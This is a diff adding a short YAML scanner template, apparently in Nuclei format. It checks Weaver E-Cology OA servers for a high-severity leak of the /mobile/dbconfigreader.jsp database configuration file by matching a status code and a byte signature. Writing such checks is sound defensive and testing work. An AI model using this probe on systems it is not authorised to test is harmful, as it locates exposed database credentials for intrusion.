@@ -1,0 +1,23 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-leak-CT-490564
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa Leak Ct 490564
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-leak-CT-490564'
+  tags: xpoc
+  reference:
+  - https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg
+http:
+- method: GET
+  path:
+  - /mobile/dbconfigreader.jsp
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - \x8a\xd2\xf1\xd4\x98~p\x05Sn
